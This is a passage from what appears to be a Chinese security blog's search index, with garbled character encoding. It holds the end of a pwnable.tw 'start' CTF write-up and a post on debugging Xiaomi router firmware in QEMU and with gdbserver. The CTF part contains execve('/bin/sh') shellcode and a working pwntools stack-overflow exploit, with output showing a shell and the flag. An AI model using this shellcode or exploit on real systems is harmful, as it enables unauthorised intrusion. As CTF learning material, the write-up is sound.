shellcode shellcodeåŒæ ·å¯ä»¥ç”¨ç³»ç»Ÿè°ƒç”¨çš„æ–¹å¼æ‰§è¡Œexecve(â€œ/bin/shâ€,NULL,NULL) name eax ebx ecx edx esi sys_execve 0x0b char __user * char user *user * char user *user * struct pt_regs â€” â€” â€” â€” â€” â€” å…¶ä¸­ï¼Œè¯¥ç¨‹åºæ˜¯ 32 ä½ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä½¿å¾— ç³»ç»Ÿè°ƒç”¨å·ï¼Œå³ eax åº”è¯¥ä¸º 0xb ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå³ ebx åº”è¯¥æŒ‡å‘ /bin/sh çš„åœ°å€ï¼Œå…¶å®æ‰§è¡Œ sh çš„åœ°å€ä¹Ÿå¯ä»¥ã€‚ ç¬¬äºŒä¸ªå‚æ•°ï¼Œå³ ecx åº”è¯¥ä¸º 0 ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå³ edx åº”è¯¥ä¸º 0 123456789xor eax,eax //æ¸…ç©ºeaxpush eax //0å…¥æ ˆï¼Œå½“ä½œå­—ç¬¦/bin/shç»“å°¾push '/sh'push '/bin' //'/sh'ä¸º3å­—èŠ‚ï¼Œæœªå¯¹é½' -&gt;'/sh\\0'æˆ–//shmov ebx, esp //æŒ‡å‘/bin/shåœ°å€xor ecx,ecxxor edx,edxmov al, 0xb //ç³»ç»Ÿè°ƒç”¨å·int 80 12345678910shellcode='''xor eax,eaxpush eaxpush %spush %smov ebx, espxor ecx,ecxxor edx,edxmov al, 0xbint 0x80''' %(u32('/sh\\0'),u32('/bin')) ä½¿ç”¨asm(shellcode)æ¥è¿›è¡Œæ±‡ç¼–,å¯ä»¥ä½¿ç”¨contextæ¥æŒ‡å®šcpuç±»å‹ä»¥åŠæ“ä½œç³»ç»Ÿï¼Œå¦‚context(arch = â€˜amd64â€™ , os = â€˜linuxâ€™, log_level=â€debugâ€) Catch THE FLAG1234567891011121314151617181920212223242526272829303132333435363738394041from pwn import *from binascii import *shellcode='''xor eax,eaxpush eaxpush %spush %smov ebx, espxor ecx,ecxxor edx,edxmov al, 0xbint 0x80''' %(u32('/sh\\0'),u32('/bin'))def dbg(): p = process('./start') context.terminal = ['gnome-terminal', '-x', 'sh', '-c'] context.log_level = 'debug' gdb.attach(proc.pidof(p)[0]) pause() return pdef leak_esp(p): start = p.recvuntil(':') payload = 'a'*0x14 + p32(0x08048087) p.send(payload) saved_esp = p.recv()[:4] return u32(saved_esp)def pwn(p,saved_esp): payload = 'a'*0x14 + p32(saved_esp + 20) + asm(shellcode) p.send(payload) p.interactive()if __name__ == '__main__': # p = dbg() # p = process(\"./start\") p = remote(\"chall.pwnable.tw\",10000) saved_esp = leak_esp(p) print \"leak saved_esp: %s\" %hex(saved_esp+20) pwn(p,saved_esp) 12345678910$ python ./start.py[+] Opening connection to chall.pwnable.tw on port 10000: Doneleak saved_esp: 0xffb43704[*] Switching to interactive mode$ whoamistart$ find -name flag./home/start/flag$ cat ./home/start/flagFLAG&#123;Pwn4bl3_tW_1s_y0ur_st4rt&#125; REFLinux ç³»ç»Ÿè°ƒç”¨ pwntoolsä½¿ç”¨http://brieflyx.me/2015/python-module/pwntools-intro/https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/https://tianstcht.github.io/pwntools%E7%9A%84%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://cool-y.github.io/categories/Pwn/"}],"tags":[{"name":"äºŒè¿›åˆ¶","slug":"äºŒè¿›åˆ¶","permalink":"https://cool-y.github.io/tags/äºŒè¿›åˆ¶/"},{"name":"Linux","slug":"Linux","permalink":"https://cool-y.github.io/tags/Linux/"},{"name":"CTF","slug":"CTF","permalink":"https://cool-y.github.io/tags/CTF/"}]},{"title":"è¿œç¨‹è°ƒè¯•å°ç±³è·¯ç”±å™¨å›ºä»¶","slug":"Debug-a-router-firmware","date":"2019-07-25T14:17:08.000Z","updated":"2021-04-10T13:39:05.082Z","comments":true,"path":"2019/07/25/Debug-a-router-firmware/","link":"","permalink":"https://cool-y.github.io/2019/07/25/Debug-a-router-firmware/","excerpt":"","text":"0x00 èƒŒæ™¯ä¸ç®€ä»‹åœ¨åˆ†æåµŒå…¥å¼è®¾å¤‡çš„å›ºä»¶æ—¶ï¼Œåªé‡‡ç”¨é™æ€åˆ†ææ–¹å¼é€šå¸¸æ˜¯ä¸å¤Ÿçš„ï¼Œä½ éœ€è¦å®é™…æ‰§è¡Œä½ çš„åˆ†æç›®æ ‡æ¥è§‚å¯Ÿå®ƒçš„è¡Œä¸ºã€‚åœ¨åµŒå…¥å¼Linuxè®¾å¤‡çš„ä¸–ç•Œé‡Œï¼Œå¾ˆå®¹æ˜“æŠŠä¸€ä¸ªè°ƒè¯•å™¨æ”¾åœ¨ç›®æ ‡ç¡¬ä»¶ä¸Šè¿›è¡Œè°ƒè¯•ã€‚å¦‚æœä½ èƒ½åœ¨è‡ªå·±çš„ç³»ç»Ÿä¸Šè¿è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè€Œä¸æ˜¯æ‹–ç€ç¡¬ä»¶åšåˆ†æ, å°†ä¼šæ–¹ä¾¿å¾ˆå¤šï¼Œè¿™å°±éœ€è¦ç”¨QEMUè¿›è¡Œä»¿çœŸã€‚è™½ç„¶QEMUåœ¨æ¨¡æ‹Ÿæ ¸å¿ƒèŠ¯ç‰‡ç»„åŒ…æ‹¬CPUä¸Šéƒ½åšçš„å¾ˆä¸é”™ï¼Œä½†æ˜¯QEMUå¾€å¾€ä¸èƒ½æä¾›ä½ æƒ³è¿è¡Œçš„äºŒè¿›åˆ¶ç¨‹åºéœ€è¦çš„ç¡¬ä»¶ã€‚æœ€å¸¸è§é—®é¢˜æ˜¯åœ¨è¿è¡Œç³»ç»ŸæœåŠ¡ï¼Œå¦‚WebæœåŠ¡å™¨æˆ–UPnPå®ˆæŠ¤è¿›ç¨‹æ—¶ï¼Œç¼ºä¹NVRAMã€‚è§£å†³æ–¹æ³•æ˜¯ä½¿ç”¨nvram-fakeråº“æ‹¦æˆªç”±libnvram.soæä¾›çš„nvram_get()è°ƒç”¨ã€‚å³ä½¿è§£å†³äº†NVRAMé—®é¢˜ï¼Œè¯¥ç¨‹åºè¿˜å¯èƒ½ä¼šå‡è®¾æŸäº›ç¡¬ä»¶æ˜¯å­˜åœ¨çš„ï¼Œå¦‚æœç¡¬ä»¶ä¸å­˜åœ¨ï¼Œè¯¥ç¨‹åºå¯èƒ½æ— æ³•è¿è¡Œï¼Œæˆ–è€…å³ä¾¿å®ƒè¿è¡Œäº†ï¼Œè¡Œä¸ºå¯èƒ½ä¹Ÿä¸åœ¨å…¶ç›®æ ‡ç¡¬ä»¶ä¸Šè¿è¡Œæ—¶æœ‰æ‰€ä¸åŒã€‚é’ˆå¯¹è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘è®¤ä¸ºæœ‰ä¸‰ç§è§£å†³æ–¹æ³•ï¼š ä¿®è¡¥äºŒè¿›åˆ¶æ–‡ä»¶ã€‚è¿™å–å†³äºæœŸæœ›ä»€ä¹ˆç¡¬ä»¶ï¼Œä»¥åŠå®ƒä¸å­˜åœ¨æ—¶çš„è¡Œä¸ºæ˜¯ä»€ä¹ˆã€‚ æŠŠå¤æ‚çš„ä¾èµ–äºç¡¬ä»¶çš„ç³»ç»ŸæœåŠ¡æ‹†åˆ†æˆå°çš„äºŒçº§åˆ¶æ–‡ä»¶ã€‚å¦‚è·³è¿‡è¿è¡ŒWebæœåŠ¡å™¨ï¼Œä»…ä»…ä»shellè„šæœ¬è¿è¡ŒcgiäºŒè¿›åˆ¶æ–‡ä»¶ã€‚å› ä¸ºå¤§å¤šæ•°cgiäºŒè¿›åˆ¶æ–‡ä»¶å°†æ¥è‡ªWebæœåŠ¡å™¨çš„è¾“å…¥ä½œä¸ºæ ‡å‡†è¾“å…¥å’Œç¯å¢ƒå˜é‡çš„ç»„åˆï¼Œå¹¶é€šè¿‡æ ‡å‡†è¾“å‡ºå°†å“åº”å‘é€åˆ°WebæœåŠ¡å™¨ã€‚ æ‹¿åˆ°è®¾å¤‡çš„shellï¼Œç›´æ¥åœ¨çœŸæœºä¸Šè¿›è¡Œè°ƒè¯•ï¼Œè¿™æ˜¯æœ€æ¥è¿‘çœŸå®çŠ¶å†µçš„æ–¹æ³•ã€‚ REFç»¼åˆï¼šå›½å¤–å¤§ç¥çš„åšå®¢é€šè¿‡QEMUå’ŒIDAProè¿œç¨‹è°ƒè¯•è®¾å¤‡å›ºä»¶MIPSæ¼æ´è°ƒè¯•ç¯å¢ƒå®‰è£…åŠæ ˆæº¢å‡ºç¯å¢ƒæ­å»ºonCTFWIKIè·¯ç”±å™¨æ¼æ´è®­ç»ƒå¹³å°è·¯ç”±å™¨0dayæ¼æ´æŒ–æ˜å®æˆ˜é€†å‘å¸¸ç”¨å·¥å…· ç¯å¢ƒæ­å»ºï¼šè·¯ç”±å™¨æ¼æ´æŒ–æ˜æµ‹è¯•ç¯å¢ƒçš„æ­å»ºä¹‹é—®é¢˜æ€»ç»“ Linuxç›¸å…³çŸ¥è¯†qcow2ã€rawã€vmdkç­‰é•œåƒæ ¼å¼Linux å¼•å¯¼è¿‡ç¨‹å†…å¹•Linuxå¯åŠ¨è¿‡ç¨‹ è°ƒè¯•æ¡ˆä¾‹CVE-2019-10999å¤ç°ã€Šå®¶ç”¨è·¯ç”±å™¨0dayæ¼æ´æŒ–æ˜ã€‹éƒ¨åˆ†æ¡ˆä¾‹TP-LINK WR941Nè·¯ç”±å™¨ç ”ç©¶ 0x01 åŸºç¡€æ¡ä»¶ ä¸€ç³»åˆ—çš„å·¥å…·ï¼ŒåŒ…æ‹¬ï¼šbinwalk å¸®åŠ©ä½ è§£åŒ…å›ºä»¶buildroot mipsäº¤å‰ç¼–è¯‘ç¯å¢ƒå¸®åŠ©ä½ åœ¨x86å¹³å°ä¸‹ç¼–è¯‘mipsæ¶æ„çš„ç›®æ ‡ç¨‹åº https://xz.aliyun.com/t/2505#toc-6qemu å¸®åŠ©ä½ æ¨¡æ‹Ÿmipsç¯å¢ƒMIPS gdbinit æ–‡ä»¶ä½¿å¾—ä½¿ç”¨gdbè°ƒè¯•mipsç¨‹åºæ—¶æ›´æ–¹ä¾¿ https://github.com/zcutlip/gdbinit-mipsmirandaå·¥å…· ç”¨äºUPnPåˆ†æ https://code.google.com/p/miranda-upnp/MIPSé™æ€æ±‡ç¼–å®¡è®¡ è¾…åŠ©è„šæœ¬ https://github.com/giantbranch/mipsAudité™æ€ç¼–è¯‘çš„gdbserver https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver ä¸€ä¸ªmips Linuxç¯å¢ƒï¼šåœ¨qemuç³»ç»Ÿæ¨¡å¼ä¸‹ï¼Œéœ€è¦æ¨¡æ‹Ÿæ•´ä¸ªè®¡ç®—æœºç³»ç»Ÿ 0x02 qemu-ç”¨æˆ·æ¨¡å¼åœ¨user modeä¸‹ä½¿ç”¨qemuæ‰§è¡Œç¨‹åºæœ‰ä¸¤ç§æƒ…å†µï¼Œä¸€æ˜¯ç›®æ ‡ç¨‹åºä¸ºé™æ€é“¾æ¥ï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥ä½¿ç”¨qemuã€‚å¦ä¸€ç§æ˜¯ç›®æ ‡ç¨‹åºä¾èµ–äºåŠ¨æ€é“¾æ¥åº“ï¼Œè¿™æ—¶å€™å°±éœ€è¦æˆ‘ä»¬æ¥æŒ‡æ˜åº“çš„ä½ç½®ï¼Œå¦åˆ™ç›®æ ‡ç¨‹åºå›åˆ°ç³»ç»Ÿ/libæ–‡ä»¶ä¸‹å¯»æ‰¾å…±äº«åº“æ–‡ä»¶ã€‚åœ¨ ã€Šæ­ç§˜å®¶ç”¨è·¯ç”±å™¨0dayã€‹ è¿™æœ¬ä¹¦é‡Œé¢ï¼Œä»–ç»™å‡ºçš„æ–¹æ³•æ˜¯ï¼š12$ cp $(which qemu-mipsel) ./$ sudo chroot . ./qemu-mipsel ./usr/sbin/miniupnpd ä»–æŠŠqemu-mipselå¤åˆ¶åˆ°å›ºä»¶æ–‡ä»¶ç›®å½•ä¸‹ï¼Œç„¶åchrootå‘½ä»¤æ”¹å˜qemuæ‰§è¡Œçš„æ ¹ç›®å½•åˆ°å½“å‰ç›®å½•ï¼ŒæŒ‰ç†è¯´æ­¤æ—¶åº”è¯¥å¯ä»¥æ‰¾åˆ°ä¾èµ–åº“,ä½†æ˜¯ç»“æœå´æ˜¯chroot: failed to run command â€˜./qemu-mipselâ€™: No such file or directory åœ¨ç½‘ä¸Šæ‰¾åˆ°äº†è§£å†³æ–¹æ³•ï¼šéœ€è¦å®‰è£…ä½¿ç”¨ qemu-mips-static æ‰å¯ä»¥123$ apt-get install qemu binfmt-support qemu-user-static$ cp $(which qemu-mipsel-static ) ./$ sudo chroot . ./qemu-mipsel-static ./usr/sbin/miniupnpd è¿™é‡Œè¿˜å¯åˆ©ç”¨-Eç”¨æ¥è®¾ç½®ç¯å¢ƒå˜é‡ï¼ŒLD_PRELOAD &quot;./lib&quot;ç”¨æ¥åŠ«æŒç³»ç»Ÿè°ƒç”¨ï¼Œå¦å¤–è¿˜æœ‰-gå¼€å¯è°ƒè¯•æ¨¡å¼ é™¤æ­¤ä¹‹å¤–ï¼Œä¹Ÿåœ¨CTF-WIKIä¸Šæ‰¾åˆ°äº†å¦ä¸€ç§æ–¹æ³•ï¼šä½¿ç”¨ qemu-mips çš„ -L å‚æ•°æŒ‡å®šè·¯ç”±å™¨çš„æ ¹ç›®å½•1$ qemu-mipsel -L . ./usr/sbin/miniupnpd æ¨¡æ‹Ÿminiupnpç”±äºæ²¡æœ‰æŒ‡å®šå‚æ•°ï¼Œæ‰€ä»¥è¿™é‡ŒminiupnpdåªæŠŠusageå’Œnotesæ‰“å°ç»™æˆ‘ä»¬äº†ï¼š1234567891011121314151617181920212223242526Usage: ./usr/sbin/miniupnpd [-f config_file] [-i ext_ifname] [-o ext_ip] [-a listening_ip] [-p port] [-d] [-U] [-S] [-N] [-u uuid] [-s serial] [-m model_number] [-t notify_interval] [-P pid_filename] [-B down up] [-w url] [-r clean_ruleset_interval] [-A \"permission rule\"] [-b BOOTID]Notes: There can be one or several listening_ips. Notify interval is in seconds. Default is 30 seconds. Default pid file is '/var/run/miniupnpd.pid'. Default config file is '/etc/miniupnpd.conf'. With -d miniupnpd will run as a standard program. -S sets \"secure\" mode : clients can only add mappings to their own ip -U causes miniupnpd to report system uptime instead of daemon uptime. -N enables NAT-PMP functionality. -B sets bitrates reported by daemon in bits per second. -w sets the presentation url. Default is http address on port 80 -A use following syntax for permission rules : (allow|deny) (external port range) ip/mask (internal port range) examples : \"allow 1024-65535 192.168.1.0/24 1024-65535\" \"deny 0-65535 0.0.0.0/0 0-65535\" -b sets the value of BOOTID.UPNP.ORG SSDP header -h prints this help and quits. æ ¹æ®miniupnpdçš„å¯åŠ¨æ–‡ä»¶/etc/init.d/miniupnpdï¼Œå°ç±³ä½¿ç”¨äº†å¯åŠ¨è„šæœ¬æ¥é…ç½®service_start /usr/sbin/miniupnpd -f conffile -då…¶é…ç½®æ–‡ä»¶connfileå¦‚ä¸‹æ‰€ç¤ºï¼š12345678910111213ext_ifname=eth0.2listening_ip=br-lanport=5351enable_natpmp=yesenable_upnp=yessecure_mode=nosystem_uptime=yeslease_file=/tmp/upnp.leasesbitrate_down=8388608bitrate_up=4194304uuid=e1f3a0ec-d9d4-4317-a14b-130cdd18d092allow 1024-65535 0.0.0.0/0 1024-65535deny 0-65535 0.0.0.0/0 0-65535 å¯è§å› è·¯ç”±å™¨çš„ç‰¹æ®Šæ€§ï¼Œå…·æœ‰ä¸¤å¼ ç½‘å¡(eth0.2&amp;br-lan)ï¼Œæš‚æ—¶æˆ‘è¿˜æ²¡æƒ³å‡ºåº”è¯¥æ€ä¹ˆè§£å†³ï¼Œæ˜¯å¦é‡‡ç”¨qemuè™šæ‹Ÿæœºé…ç½®ç½‘ç»œå¯ä»¥è§£å†³å‘¢ï¼Ÿåæ­£æˆ‘é‡‡ç”¨ä¸‹é¢è¿™ç§ç²—æš´çš„æ–¹å¼æ˜¯ä¸å¯ä»¥çš„(ç›´æ¥æŒ‡å®šé…ç½®æ–‡ä»¶)1234$ sudo qemu-mipsel -L . ./usr/sbin/miniupnpd -f ../../MiniUPnP/miniupnpd.conf -dminiupnpd[7687]: system uptime is 5652 secondsminiupnpd[7687]: iptc_init() failed : iptables who? (do you need to insmod?)miniupnpd[7687]: Failed to init redirection engine. EXITING 0x03 qemu-ç³»ç»Ÿæ¨¡å¼ç³»ç»Ÿæ¨¡å¼å‘½ä»¤æ ¼å¼ï¼š$qemu system-mips [option][disk_image] MIPSç³»ç»Ÿç½‘ç»œé…ç½®ä¸‹è½½mipsç³»ç»Ÿå†…æ ¸å’Œè™šæ‹Ÿæœºé•œåƒ https://people.debian.org/~aurel32/qemu/1234To use this image, you need to install QEMU 1.1.0 (or later). Start QEMUwith the following arguments for a 32-bit machine: - qemu-system-mipsel -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mipsel_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; - qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; 1. å®‰è£…ä¾èµ–æ–‡ä»¶apt-get install uml-utilities bridge-utils 2. ä¿®æ”¹ä¸»æœºç½‘ç»œé…ç½®12345678910auto loiface lo inet loopbackauto ens33iface eth0 inet dhcp#auto br0iface br0 inet dhcp bridge_ports ens33 bridge_maxwait 0 3. ä¿®æ”¹qemuç½‘ç»œæ¥å£å¯åŠ¨è„šæœ¬123456789$ sudo vim /etc/qemu-ifup $ sudo chmod a+x /etc/qemu-ifup#!/bin/shecho &quot;Executing /etc/qemu-ifup&quot;echo &quot;Bringing $1 for bridged mode...&quot;sudo /sbin/ifconfig $1 0.0.0.0 promisc upecho &quot;Adding $1 to br0...&quot;sudo /sbin/brctl addif br0 $1sleep 3 1$ sudo /etc/init.d/networking restart 4. qemuå¯åŠ¨é…ç½®12$ sudo ifdown ens33$ sudo ifup br0 5. å¯åŠ¨mipsè™šæ‹Ÿæœºsudo qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic,macaddr=00:16:3e:00:00:01 -net tap -nographic æˆ‘è‡ªé—­äº†ï¼Œubuntu18æ ¹æœ¬æ²¡æ³•è”ç½‘ï¼Œäºæ˜¯æˆ‘ç”¨äº†ubuntu14.0 0x04 åœ¨mipsè™šæ‹Ÿæœºä¸­è°ƒè¯•ç°åœ¨é€šè¿‡ä¸Šé¢çš„é…ç½®æˆ‘å¾—åˆ°äº†è¿™æ ·ä¸€å°è™šæ‹Ÿæœºï¼Œå¹¶é€šè¿‡sshè¿æ¥ä¸Šå»ã€‚12345678910111213141516171819root@debian-mipsel:/home/user/mi_wifi_r3_112# ifconfigeth1 Link encap:Ethernet HWaddr 00:16:3e:00:00:01 inet addr:192.168.31.246 Bcast:192.168.31.255 Mask:255.255.255.0 inet6 addr: fe80::216:3eff:fe00:1/64 Scope:Link UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:89377 errors:75 dropped:360 overruns:0 frame:0 TX packets:9114 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:103978997 (99.1 MiB) TX bytes:924287 (902.6 KiB) Interrupt:10 Base address:0x1020lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 inet6 addr: ::1/128 Scope:Host UP LOOPBACK RUNNING MTU:16436 Metric:1 RX packets:8 errors:0 dropped:0 overruns:0 frame:0 TX packets:8 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:560 (560.0 B) TX bytes:560 (560.0 B) å·²ç»æŠŠæˆ‘çš„å°ç±³å›ºä»¶å…¨éƒ¨ä¸Šä¼ åˆ°è¿™ä¸ªè™šæ‹Ÿæœºä¸­12root@debian-mipsel:/home/user/mi_wifi_r3_112# lsbin data dev etc extdisks lib libnvram-faker.so mnt opt overlay proc qemu-mipsel-static readonly rom root sbin sys tmp userdisk usr var www å’Œç”¨æˆ·æ¨¡å¼ä¸€æ ·ï¼Œè¿˜æ˜¯ä½¿ç”¨chrootï¼Œå› ä¸ºç›®æ ‡äºŒè¿›åˆ¶æ˜¯å’Œå›ºä»¶çš„åº“é“¾æ¥çš„ï¼Œå¾ˆå¯èƒ½ä¸èƒ½è·ŸDebiançš„å…±äº«åº“ä¸€èµ·å·¥ä½œã€‚123456789101112131415161718192021222324252627root@debian-mipsel:/home/user/mi_wifi_r3_112# chroot . ./usr/sbin/miniupnpdUsage: ./usr/sbin/miniupnpd [-f config_file] [-i ext_ifname] [-o ext_ip] [-a listening_ip] [-p port] [-d] [-U] [-S] [-N] [-u uuid] [-s serial] [-m model_number] [-t notify_interval] [-P pid_filename] [-B down up] [-w url] [-r clean_ruleset_interval] [-A \"permission rule\"] [-b BOOTID]Notes: There can be one or several listening_ips. Notify interval is in seconds. Default is 30 seconds. Default pid file is '/var/run/miniupnpd.pid'. Default config file is '/etc/miniupnpd.conf'. With -d miniupnpd will run as a standard program. -S sets \"secure\" mode : clients can only add mappings to their own ip -U causes miniupnpd to report system uptime instead of daemon uptime. -N enables NAT-PMP functionality. -B sets bitrates reported by daemon in bits per second. -w sets the presentation url. Default is http address on port 80 -A use following syntax for permission rules : (allow|deny) (external port range) ip/mask (internal port range) examples : \"allow 1024-65535 192.168.1.0/24 1024-65535\" \"deny 0-65535 0.0.0.0/0 0-65535\" -b sets the value of BOOTID.UPNP.ORG SSDP header -h prints this help and quits. ç›´æ¥è¿è¡Œèµ·æ¥ï¼Œè¿˜æ˜¯åªæ‰“å°å‡ºusageï¼Œè¿™é‡Œæˆ‘æ³¨æ„åˆ°ä¹‹å‰å¿½è§†çš„åœ°æ–¹Default config file is &#39;/etc/miniupnpd.conf&#39;.ï¼Œæ‰€ä»¥æˆ‘ä¸å†ä½¿ç”¨-få‚æ•°æ¥æŒ‡å®šï¼Œè€Œæ˜¯æŠŠé…ç½®æ–‡ä»¶æ”¾åœ¨é»˜è®¤ç›®å½•ä¸‹ï¼Œåœ¨å°ç±³è·¯ç”±å™¨é‡Œï¼Œext_ifnameæ˜¯å¤–éƒ¨ipï¼Œlistening_ipæ˜¯å†…éƒ¨ipã€‚ä½†æ˜¯æˆ‘è¿™é‡Œè¿˜æ²¡æœ‰å¼€å¯ä¸¤ä¸ªï¼Œæ‰€ä»¥éƒ½èµ‹å€¼ä¸ºä¸€å¼ ç½‘å¡ã€‚12345678910111213ext_ifname=eth1listening_ip=eth1port=5351enable_natpmp=yesenable_upnp=yessecure_mode=nosystem_uptime=yeslease_file=/tmp/upnp.leasesbitrate_down=8388608bitrate_up=4194304uuid=e1f3a0ec-d9d4-4317-a14b-130cdd18d092allow 1024-65535 0.0.0.0/0 1024-65535deny 0-65535 0.0.0.0/0 0-65535 åœ¨è¿™ä¸ªé…ç½®ä¸‹ï¼Œè¿è¡Œminiupnpè¿˜æ˜¯è¢«å‘ŠçŸ¥daemon(): No such file or directory12root@debian-mipsel:/home/user/mi_wifi_r3_112# chroot . ./usr/sbin/miniupnpdroot@debian-mipsel:/home/user/mi_wifi_r3_112# daemon(): No such file or directory æˆ‘èµ·åˆçŒœæµ‹æ˜¯å› ä¸ºç¼ºä¹NVRAM åœ¨è¿è¡Œç³»ç»ŸæœåŠ¡ï¼Œå¦‚WebæœåŠ¡å™¨æˆ–UPnPå®ˆæŠ¤è¿›ç¨‹æ—¶ï¼Œç¼ºä¹NVRAMã€‚éæ˜“å¤±æ€§RAMé€šå¸¸æ˜¯åŒ…å«é…ç½®å‚æ•°çš„è®¾å¤‡å¿«é€Ÿå­˜å‚¨å™¨çš„ä¸€ä¸ªåˆ†åŒºã€‚å½“ä¸€ä¸ªå®ˆæŠ¤è¿›ç¨‹å¯åŠ¨æ—¶ï¼Œå®ƒé€šå¸¸ä¼šå°è¯•æŸ¥è¯¢NVRAMï¼Œè·å–å…¶è¿è¡Œæ—¶é…ç½®ä¿¡æ¯ã€‚æœ‰æ—¶ä¸€ä¸ªå®ˆæŠ¤è¿›ç¨‹ä¼šæŸ¥è¯¢NVRAMçš„å‡ åç”šè‡³ä¸Šç™¾ä¸ªå‚æ•°ã€‚ äºæ˜¯æˆ‘è¿è¡ŒäºŒè¿›åˆ¶ç¨‹åºæ—¶ï¼Œä½¿ç”¨LD_PRELOADå¯¹nvram-fakeråº“è¿›è¡Œé¢„åŠ è½½ã€‚å®ƒä¼šæ‹¦æˆªé€šå¸¸ç”±libnvram.soæä¾›çš„nvram_get()è°ƒç”¨ã€‚nvram-fakerä¼šæŸ¥è¯¢ä½ æä¾›çš„ä¸€ä¸ªINIé£æ ¼çš„é…ç½®æ–‡ä»¶ï¼Œè€Œä¸æ˜¯è¯•å›¾æŸ¥è¯¢NVRAMã€‚è¿™é‡Œæœ‰ä¸€ä¸ªé“¾æ¥ï¼šhttps://github.com/zcutlip/nvram-faker12root@debian-mipsel:/home/user/mi_wifi_r3_112# chroot . /bin/sh -c \"LD_PRELOAD=/libnvram-faker.so /usr/sbin/miniupnpd\"root@debian-mipsel:/home/user/mi_wifi_r3_112# daemon(): No such file or directory é—®é¢˜ä¾ç„¶å­˜åœ¨ï¼Œdaemonæ˜¯åœ¨miniupnpdä¸­å¸¸å‡ºç°çš„è¯ï¼ŒçŒœæµ‹ï¼Œä¼šä¸ä¼šæŸäº›å‡½æ•°æ²¡æœ‰å®ç°ï¼Ÿè¿™éƒ¨åˆ†ä¼šæ¯”è¾ƒéº»çƒ¦ï¼Œéœ€è¦åæ±‡ç¼–ã€‚ä½†æ˜¯ï¼Œæˆ‘ä»¬ä¸æ˜¯å¯ä»¥æ‹¿åˆ°è·¯ç”±å™¨çš„shellå—ï¼å¹²å˜›è¿˜è¦ç”¨qemuæ¨¡æ‹Ÿå†è°ƒè¯•ï¼Œç›´æ¥ä¸ŠçœŸæœºï¼ 0x05 è®¾å¤‡ä¸Šè°ƒè¯•ç¨‹åº 1ã€æœ‰shellæƒé™2ã€æœ‰é™æ€ç¼–è¯‘çš„gdbserveræˆ–è€…gdb åªè¦æ»¡è¶³ä¸Šé¢ä¸¤ä¸ªæ¡ä»¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡åœ¨è·¯ç”±å™¨ä¸Šè¿è¡Œgdbserver_mipsle --attach 0.0.0.0:port PID ä»¥åŠ åœ¨ä½ çš„ç”µè„‘ä¸Šä½¿ç”¨ gdb-multiarch è¿›è¡Œè°ƒè¯•(å…ˆæŒ‡å®šæ¶æ„ï¼Œç„¶åä½¿ç”¨remoteåŠŸèƒ½)è½»æ¾åœ°è°ƒè¯•è®¾å¤‡ä¸Šåœ°mipsç¨‹åºã€‚12pwndbg&gt; set architecture mips (ä½†å¤§å¤šæ•°æƒ…å†µä¸‹è¿™ä¸€æ­¥å¯ä»¥çœç•¥, ä¼¼ä¹ pwndbg èƒ½è‡ªåŠ¨è¯†åˆ«æ¶æ„)pwndbg&gt; target remote localhost:1234 èƒ½æ ¹æ®å›ºä»¶ä¸­çš„binå¾—çŸ¥è¿™æ˜¯ä¸€ä¸ªå°ç«¯mipsæŒ‡ä»¤é›†çš„è®¾å¤‡ï¼Œgdbserverä¹Ÿä¸ç”¨è‡ªå·±ç¼–è¯‘ï¼Œç›´æ¥ä¸‹è½½ç¼–è¯‘å¥½çš„: https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserveræŠŠgdbserver.mipsbeé€šè¿‡tftpä¸Šä¼ åˆ°è·¯ç”±å™¨çš„/tmpç›®å½•ä¸‹ï¼Œç„¶åæ‰¾åˆ°ç›®æ ‡ç¨‹åºPIDï¼š123root@XiaoQiang:/# ps |grep miniupnp12517 root 1772 S grep miniupnp28284 root 1496 S /usr/sbin/miniupnpd -f /var/etc/miniupnpd.conf gdbserver attachè¿™ä¸ªè¿›ç¨‹ï¼Œå°±å¯ä»¥é€šè¿‡gdbæˆ–è€…IDAè¿œç¨‹è°ƒè¯•è¿™ä¸ªç¨‹åº","categories":[{"name":"IOT","slug":"IOT","permalink":"https://cool-y.github.io/categories/IOT/"}],"tags":[{"name":"å°ç±³","slug":"å°ç±³","permalink":"https://cool-y.github.io/tags/å°ç±³/"},{"name":"è·¯ç”±å™¨","slug":"è·¯ç”±å™¨","permalink":"https://cool-y.github.io/tags/è·¯ç”±å™¨/"},{"name":"è°ƒè¯•","slug":"è°ƒè¯•","permalink":"https://cool-y.github.io/tags/è°ƒè¯•/"}]},{"title":"è·å–å›ºä»¶çš„å‡ 